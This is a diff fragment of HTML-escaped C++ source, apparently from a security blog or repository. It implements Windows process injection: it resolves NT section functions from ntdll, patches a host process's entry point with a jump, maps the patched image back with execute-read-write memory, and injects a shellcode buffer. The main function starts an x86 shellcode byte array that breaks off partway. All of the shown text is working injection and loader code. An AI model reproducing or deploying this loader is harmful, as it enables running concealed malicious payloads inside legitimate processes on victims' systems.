+myNtMapViewOfSection fNtMapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtMapViewOfSection)(GetProcAddress(
+    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtMapViewOfSection&amp;#34;&lt;/span&gt;));
+myZwUnmapViewOfSection fZwUnmapViewOfSection &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myZwUnmapViewOfSection)(GetProcAddress(
+    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ZwUnmapViewOfSection&amp;#34;&lt;/span&gt;));
+myNtGetContextThread fNtGetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtGetContextThread)(GetProcAddress(
+    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtGetContextThread&amp;#34;&lt;/span&gt;));
+myNtSetContextThread fNtSetContextThread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (myNtSetContextThread)(GetProcAddress(
+    GetModuleHandleA(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ntdll&amp;#34;&lt;/span&gt;),
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NtSetContextThread&amp;#34;&lt;/span&gt;));
+
+DWORD &lt;span style=&#34;color:#a6e22e&#34;&gt;GetSizeOfImage&lt;/span&gt;(BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; processImage)
+{
+    IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+    IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+
+    dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage;
+    ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dosHeader&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_lfanew);
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ntHeaders&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;OptionalHeader.SizeOfImage;
+}
+
+DWORD &lt;span style=&#34;color:#a6e22e&#34;&gt;GetEntryPoint&lt;/span&gt;(BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; processImage)
+{
+    IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+    IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+
+    dosHeader &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_DOS_HEADER&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage;
+    ntHeaders &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (IMAGE_NT_HEADERS&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; dosHeader&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;e_lfanew);
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (ntHeaders&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;OptionalHeader.AddressOfEntryPoint);
+}
+
+PVOID &lt;span style=&#34;color:#a6e22e&#34;&gt;PatchHostProcess&lt;/span&gt;(HOST&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; hostProcess, PVOID shellcodeAddress)
+{
+    &lt;span style=&#34;color:#75715e&#34;&gt;// read enough bytes to get the size of image
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    SIZE_T bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+    BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; imageData &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt;(BYTE[SECTION_SIZE]);
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// both calls read the same chunk of same size because this readprocessmemory fails we change the size 
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;ReadProcessMemory(
+        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
+        (LPCVOID)hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress, 
+        imageData,
+        SECTION_SIZE, 
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; SECTION_SIZE)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] failed to read process image headers&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    }
+
+    DWORD sizeOfImage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GetSizeOfImage(imageData);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;delete&lt;/span&gt;[] imageData;
+
+    BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; processImage &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt;(BYTE[sizeOfImage]);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;ReadProcessMemory(
+        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
+        (LPCVOID)hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress, 
+        processImage,
+        sizeOfImage, 
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; sizeOfImage)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] failed to read process image&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    }
+
+    DWORD entryPoint &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GetEntryPoint(processImage);
+
+    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]Original entry point : 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+
+    memset(processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);
+
+    DWORD processEntry &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint;
+
+    DWORD relativeAddr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (((DWORD)shellcodeAddress &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; processEntry) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;);
+
+    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((BYTE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xe9&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// jmp
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(uintptr_t&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)((uintptr_t)processImage &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; entryPoint &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; relativeAddr; &lt;span style=&#34;color:#75715e&#34;&gt;// address
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+    LARGE_INTEGER sectionSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { sizeOfImage };
+    HANDLE sectionHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+    PVOID sectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtCreateSection(
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionHandle, 
+        SECTION_ALL_ACCESS, 
+        NULL, 
+        (PLARGE_INTEGER)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionSize, 
+        PAGE_EXECUTE_READWRITE,
+        SEC_COMMIT, NULL) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] create section failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    }
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
+        sectionHandle, 
+        GetCurrentProcess(), 
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionAddress, 
+        NULL, NULL, NULL, 
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
+        PAGE_EXECUTE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] create section failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    }
+
+    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]replacing patched process image at 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+
+    memcpy(sectionAddress, processImage, sizeOfImage);
+    sectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (PVOID)hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress;
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fZwUnmapViewOfSection(
+        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
+        sectionAddress) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] unmapping failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    }
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
+        sectionHandle, 
+        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionAddress, 
+        NULL, NULL, NULL,
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead, 
+        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
+        PAGE_EXECUTE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;create section failed&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    }
+
+    CloseHandle(sectionHandle);
+
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;delete&lt;/span&gt;[] processImage;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (PVOID)processEntry;
+}
+
+PVOID &lt;span style=&#34;color:#a6e22e&#34;&gt;InjectShellcode&lt;/span&gt;(HOST&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; hostProcess, SHELLCODE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; s)
+{
+    LARGE_INTEGER sectionSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize };
+    HANDLE sectionHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+    PVOID localSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL, remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// create a read write execute memory region in the local process
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtCreateSection(
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionHandle, 
+        SECTION_MAP_READ &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; SECTION_MAP_WRITE &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; SECTION_MAP_EXECUTE, 
+        NULL,
+        (PLARGE_INTEGER)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;sectionSize, 
+        PAGE_EXECUTE_READWRITE, 
+        SEC_COMMIT, 
+        NULL) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create section failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    }
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// create a view of the memory section in the local process
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
+        sectionHandle, 
+        GetCurrentProcess(), 
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;localSectionAddress, 
+        NULL, NULL, NULL,
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize, 
+        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
+        PAGE_READWRITE) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    }
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;// create a map view of the section in the target process
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fNtMapViewOfSection(
+        sectionHandle, 
+        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;remoteSectionAddress, 
+        NULL, NULL, NULL,
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize, 
+        &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, NULL, 
+        PAGE_EXECUTE_READ) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; STATUS_SUCCESS)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Create map failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
+    }
+
+    memcpy(localSectionAddress, s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcode, s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize);
+    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]Shellcode injected to 0x&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;hex &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; (DWORD)remoteSectionAddress &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+
+    CloseHandle(sectionHandle);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; remoteSectionAddress;
+}
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+{
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; buf[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e\x20\x8b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60\x8b\x6c\x24&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b\x4a\x18\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c\x61\xc3\xb2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xff\xff\xff\x89\x45\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe8\x8e\xff\xff\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x32\x2e\x64\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
